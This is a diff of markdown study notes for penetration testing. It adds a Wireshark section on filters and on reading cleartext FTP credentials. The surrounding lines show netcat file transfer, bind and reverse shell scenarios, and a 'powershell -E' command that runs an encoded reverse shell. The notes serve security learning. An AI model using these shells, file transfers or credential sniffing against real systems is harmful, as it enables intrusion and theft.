@@ -52,7 +52,7 @@ nc <IP ADDRESS> <PORT> < /path/to/file
 + netcat has command redirection
 + It can redirect input/output of an executable to a TCP/UDP port
 
-![01](./images/01.png)
+![01.png](./images/01.png)
 
 Bob is running Windows and Alice is running Linux\
 In first scenario Alice wants to connect to Bob's machine and do stuff
@@ -72,7 +72,7 @@ nc -nv <Bob IP> 4444
 ```
 
 
-![02](./images/02.png)
+![02.png](./images/02.png)
 In second scenario Bob wants to connect to Alice's computer and do stuff
 **netcat reverse shell scenario**
 + First Bob starts netcat on port 4444 on his Windows machine
@@ -388,3 +388,62 @@ To run it we should run it with powershell command and `-E` oprtion which is for
 ```powershell
 powershell -E "Content of encodedreverseshell.ps1"
 ```
+
+# 4 - WIRESHARK
++ It's a network analyzer tool that every penetration tester must know it well
++ It is used for analyzing network traffic, sniffing and debugging network services
+
+## 4.1 - WIRESHARK BASICS
++ We can apply capture filters and display filters to see results better without noices
++ It is necessary to know how to use filters to better visualize network traffic
+
+## 4.2 - LAUNCHING WIRESHARK
+ + We can launch wireshark using terminal
+
+```bash
+sudo wireshark
+# We need sudo for capturing network traffic
+```
+
+## 4.3 - CAPTURE FILTERS
++ We can use capure filter to reduce the amount of capture traffic
++ For example start by selecting interface `eth0` and enter `net 10.11.1.0/24` for specifying address range
+
+![03.png](./images/03.png)
+
+## 4.4 - DISPLAY FILTERS
++ Now that we have wireshark capturing our network network traffic we can login to a FTP server and inspect its traffic
++ First we should login to a FTP server
+
+```bash
+ftp 10.11.1.13
+Connected to 10.11.1.13
+220 Microsoft FTP Service
+Name (10.11.1.13:kali): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password:
+230 Anonymous user logged in.
+Remote system type is Windows_NT.
+ftp> quit
+221
+```
+
++ Next to apply appropriate filter we will use Display Filters like below (port number equal to 21 which is FTP default port bumber ) to see only ftp traffic
+
+![04.png](./images/04.png)
+
+## 4.5 - FOLLOWING TCP STREAMS
++ We can use wireshark TCP Stream ability to view the sequences of a perticular session traffic like our previous FTP login
++ Select a packet from the network connection you want to see its stream
++ Right Click > Follow > TCP Stream
+
+![05.png](./images/05.png)
+
++ No we can see our FTP login connection
++ Because FTP is insecure without any encryption, We can see the username and password `anonymous:anonymous` in clear text
+
+![06.png](./images/06.png)
+
++ You can clear the display filters by clicking `X` like below:
+
+![07.png](./images/07.png)
